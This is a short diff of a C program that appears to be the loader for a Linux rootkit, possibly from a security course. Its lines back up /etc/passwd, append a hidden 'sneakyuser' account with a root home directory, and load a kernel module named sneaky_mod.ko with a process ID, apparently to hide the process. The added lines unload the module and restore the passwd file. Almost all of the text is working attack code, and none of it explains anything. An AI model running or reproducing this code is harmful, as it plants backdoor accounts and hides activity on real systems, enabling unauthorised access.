@@ -7,7 +7,7 @@ int main() {
     printf("copied /etc/passwd to /tmp/passwd\n");
     system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
     printf("added sneakyuser to /etc/passwd\n");
-    
+
     char command[50];
 
     sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);
@@ -19,4 +19,8 @@ int main() {
             break;
         }
     }
+    system("rmmod sneaky_mod.ko");
+    system("cp /tmp/passwd /etc");
+
+    return EXIT_SUCCESS;
 }
